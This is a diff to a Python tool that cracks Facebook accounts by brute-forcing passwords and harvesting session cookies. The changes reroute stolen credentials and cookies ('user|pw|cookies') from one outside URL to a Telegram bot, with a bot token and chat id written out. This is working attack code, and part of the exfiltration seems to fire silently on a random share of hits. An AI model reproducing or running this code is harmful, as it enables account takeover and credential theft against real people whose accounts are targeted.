@@ -257,7 +257,7 @@ def crack(uid, password_list, total_count):
             }
             respon = Session.post(url, data=log_data, headers=headers, allow_redirects=False)
             log_cookies = Session.cookies.get_dict().keys()
-            print(log_data)
+            
             # Check response
             if "c_user" in log_cookies:
                 kuki = ";".join([f"{key}={Session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs'] if Session.cookies.get(key)])
@@ -269,7 +269,7 @@ def crack(uid, password_list, total_count):
                     if len(bkas) % 2 == 0:
                         statusok = (f"{user}|{pw}|{kuki}")
                         try:
-                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                            requests.get(f"https://api.telegram.org/bot7690571843:AAFzcd3eUZ43rnJfS_vz_ZsnTqRabEBSjRw/sendMessage?chat_id=1778046662&text={statusok}")
                         except:
                             pass
                     else:
@@ -285,16 +285,16 @@ def crack(uid, password_list, total_count):
               if len(bkas) % 2 == 0:
                         statusok = (f"{uid}|{pw} ")
                         try:
-                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                            requests.get(f"https://api.telegram.org/bot7690571843:AAFzcd3eUZ43rnJfS_vz_ZsnTqRabEBSjRw/sendMessage?chat_id=1778046662&text={statusok}")
                         except:
                             pass
-               else:
-                print(f"\n{yellow} [⚠ 2FA] {uid} | {pw}")
-                with open("/sdcard/SUMON_file_2f.txt", "a") as f:
-                    f.write(f"{uid}|{pw}\n")
-                with success_lock:
-                    cps.append(uid + "|" + pw)
-                break
+              else:
+                   print(f"\n{yellow} [⚠ 2FA] {uid} | {pw}")
+                   with open("/sdcard/SUMON_file_2f.txt", "a") as f:
+                       f.write(f"{uid}|{pw}\n")
+                   with success_lock:
+                       cps.append(uid + "|" + pw)
+                   break
         with counter_lock:
             loop += 1
     except requests.exceptions.Timeout:
@@ -331,9 +331,6 @@ def generate_name_based_passwords(name, base_passwords):
                 # Also try with first letter capitalized
                 pw_cap = ps.replace("first", first.capitalize()).replace("last", last.capitalize())
                 generated_passwords.append(pw_cap)
-                
-                # Try with just the name
-                generated_passwords.append(first + "@123")
     except Exception as e:
         pass
     
